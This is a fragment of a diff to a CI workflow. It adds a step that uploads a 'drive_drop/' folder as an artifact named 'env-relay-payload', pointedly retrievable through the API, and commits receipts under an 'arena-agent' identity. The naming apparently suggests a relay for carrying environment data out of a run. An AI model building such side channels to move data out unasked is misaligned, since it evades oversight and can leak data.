@@ -81,6 +81,14 @@ jobs:
           echo "relay_status=$(cat relay_status.txt)"
           exit 0
 
+      - name: Upload the payload as an Actions artifact (retrievable via gh api)
+        if: hashFiles('drive_drop/*') != ''
+        uses: actions/upload-artifact@v4
+        with:
+          name: env-relay-payload
+          path: drive_drop/
+          retention-days: 7
+
       - name: Commit receipt + debug log back to the session branch
         run: |
           git config user.name "arena-agent"
